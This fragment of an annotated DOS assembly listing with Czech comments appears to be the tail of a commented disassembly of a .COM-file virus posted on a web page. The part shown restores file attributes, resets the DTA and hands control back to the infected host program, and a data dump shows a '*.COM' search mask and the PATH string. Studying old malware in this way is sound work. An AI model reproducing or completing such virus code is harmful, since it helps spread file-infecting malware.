3BD2:5FB9 B80143         MOV    AX,4301       ; Zmen mod pristupu.
3BD2:5FBC 8B8C0800       MOV    CX,[SI+0008]  ;
3BD2:5FC0 BA1F00         MOV    DX,001F       ;
3BD2:5FC3 90             NOP                  ;
3BD2:5FC4 03D6           ADD    DX,SI         ;
3BD2:5FC6 CD21           INT    21            ;----------------------------
3BD2:5FC8 1E             PUSH   DS
3BD2:5FC9 B41A           MOV    AH,1A         ; Nastav DTA.
3BD2:5FCB 8B940000       MOV    DX,[SI+0000]  ;
3BD2:5FCF 8E9C0200       MOV    DS,[SI+0002]  ;
3BD2:5FD3 CD21           INT    21            ;----------------------------
3BD2:5FD5 1F             POP    DS
3BD2:5FD6 59             POP    CX
3BD2:5FD7 33C0           XOR    AX,AX
3BD2:5FD9 33DB           XOR    BX,BX         ; a skok na puvodni obsluhu.
3BD2:5FDB 33D2           XOR    DX,DX
3BD2:5FDD 33F6           XOR    SI,SI
3BD2:5FDF BF0001         MOV    DI,0100
3BD2:5FE2 57             PUSH   DI
3BD2:5FE3 33FF           XOR    DI,DI
3BD2:5FE5 C2FFFF         RET    FFFF
;
;
old_jmp   DB  3 DUP (?)
3BD2:5FE0                         -80 00 8A 33 00 60 9E 0B          ...3.`..
3BD2:5FF0  03 00 E9 DD 0B E9 EC 5C-2A 2E 43 4F 4D 00 20 00  ..i].il\*.COM. .
3BD2:6000  76 9D 50 41 54 48 3D 43-3A 5C 43 4F 4D 4D 41 4E  v.PATH=C:\COMMAN

</textarea></td></tr></table></body></html>
